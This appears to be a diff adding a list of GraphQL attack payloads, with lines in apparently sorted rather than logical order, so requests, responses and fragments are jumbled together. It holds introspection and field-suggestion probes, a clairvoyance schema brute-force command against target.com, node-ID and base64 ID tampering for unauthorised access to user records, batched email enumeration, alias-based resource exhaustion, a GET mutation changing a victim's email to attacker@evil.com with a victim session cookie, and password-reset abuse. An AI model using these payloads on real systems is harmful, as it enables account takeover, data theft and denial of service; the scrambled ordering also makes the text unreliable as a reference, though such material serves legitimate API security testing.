@@ -1,0 +1,53 @@
+"extensions": {
+"persistedQuery": {
+"query": "{ user(id: 1) { email role } }"
+... on Repository { name owner { login } }
+... on User { id email name role permissions }
+/api/me
+Content-Type: application/json
+Cookie: session=victim_session
+GET /api/me
+GET /graphql?query=...
+GET /graphql?query=mutation{changeEmail(newEmail:"attacker@evil.com")} HTTP/1.1
+GET /graphql?query={user(id:1){email}} HTTP/1.1
+POST /graphql HTTP/1.1
+VXNlcjoxMjM=
+[
+[{ "query": "..." }, { "query": "..." }, ...]
+]
+__schema {
+application/json
+clairvoyance -o schema.json -w wordlist.txt https://target.com/graphql
+echo "VXNlcjox" | base64 -d
+fields { name type { name kind ofType { name kind } } }
+friends {
+friends { id name }
+gql\
+inputFields { name type { name kind } }
+mutation {
+node(id: "User:other-user-id") { ... on User { email role } }
+node(id: "VXNlcjoxMjM=") {
+node(id: "VXNlcjoxOTk5") {
+query=
+queryType { name }
+types {
+user(id: 1) {
+{
+{ __typename }
+{ r1: expensiveReport, r2: expensiveReport, r3: expensiveReport, ... }
+{ resetPassword(email: "victim@target.com") { success } }
+{ userrr { id } }
+{"data": null, "errors": [...]}
+{"data": {"user": {"email": "victim@target.com"}}, "errors": null}
+{"data":{"__schema":null}}
+{"data":{"__typename":"Query"}}
+{"errors":[{"message":"Cannot query field \"userrr\" on type \"Query\". Did you mean \"user\" or \"users\"?"}]}
+{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}
+{"query": "..."}
+{"query":"{ __typename }"}
+{"query":"{ user(id:1) { email } }"},
+{"query":"{ user(id:2) { email } }"},
+{"query":"{ user(id:3) { email } }"}
+{"query":"{ userrr { id } }"}
+}
+},
